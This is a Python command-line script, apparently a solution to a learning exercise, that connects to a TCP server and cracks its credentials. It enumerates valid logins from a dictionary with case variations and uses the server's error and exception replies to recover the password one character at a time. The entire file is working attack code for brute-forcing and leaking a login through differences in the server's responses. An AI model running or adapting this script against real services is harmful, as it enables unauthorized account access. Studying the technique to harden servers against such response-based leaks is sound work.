import json
import logging
import socket

from string import ascii_letters, digits
from argparse import ArgumentParser
from itertools import product
from typing import Final, Iterator


LOGIN_DICTIONARY: Final[str] = "./login_dictionary.txt"

logging.basicConfig(level=logging.DEBUG, format="%(levelname)s:%(message)s")

def main() -> None:
    """Connect to a TCP server and attempt to crack its login credentials."""


    parser: ArgumentParser = ArgumentParser(description="Discover a TCP Server's login and password using dictionary and prefix-based attacks.")


    # Add command line arguments
    parser.add_argument("ip_address")
    parser.add_argument("port", type=int)

    args = parser.parse_args()
    ip_address: str = args.ip_address
    port: int = args.port

    # Establish a socket connection
    with socket.socket() as client_socket:
        client_socket.settimeout(5)
        address: tuple[str, int] = (ip_address, port)

        client_socket.connect(address)

        logging.info("Socket address successfully connected %s", address)

        # Find a valid login by testing case variations of dictionary entries.
        with open(LOGIN_DICTIONARY, "r", encoding="utf-8") as f:
            for line in f:
                login = line.strip()

                for login_variation in generate_case_variations(login):
                    logging.debug("Trying login: %s", login_variation)
                    client_socket.sendall(create_login_request(login_variation).encode())
                    response = json.loads(client_socket.recv(1024).decode())

                    result = response.get("result")

                    if result is None:
                        raise KeyError("Unexpected Server Response")

                    if response["result"] == "Wrong password!" or response["result"] == "Exception happened during login":
                        logging.info("Valid login discovered")

                        # Extend the password prefix using the server's responses.
                        password = ""
                        while True:
                            for candidate in generate_password_candidates(password):
                                client_socket.sendall(create_login_request(login_variation, candidate).encode())
                                response = json.loads(client_socket.recv(1024).decode())

                                if response["result"] == "Exception happened during login":
                                    # The server's exception response confirms a matching password prefix.
                                    password = candidate
                                    logging.debug("Password prefix extended to %d characters", len(password))
                                    break
                                elif response["result"] == "Connection success!":
                                    password = candidate
                                    logging.info("Password successfully discovered")
                                    print(create_login_request(login_variation, password))
                                    return
                            else:
                                raise RuntimeError("No valid next password character found")

            else:
                raise RuntimeError("No valid login found")



def generate_case_variations(line: str) -> Iterator[str]:
    """
    Lazily generate all case variations of a string.

    Args:
        line: A string to generate case variations for.

    Yields:
        str: The next possible case variation.
    """

    if not isinstance(line, str):
        raise TypeError("Input for case generation must be a string.")

    choices: list[tuple[str, ...]] = []

    for char in line:

        if char.isalpha():
            variations = (char.lower(), char.upper())
        else:
            variations = (char,)

        choices.append(variations)

    yield from ("".join(chars) for chars in product(*choices))


def generate_password_candidates(password_prefix: str) -> Iterator[str]:
    """Lazily generate password candidates by appending possible characters to a prefix."""

    for char in ascii_letters + digits:
        yield password_prefix + char


def create_login_request(login: str, password: str = "") -> str:
    """Create a JSON login request with optional password."""
    return json.dumps({
        "login": login,
        "password": password
    })



if __name__ == "__main__":
    main()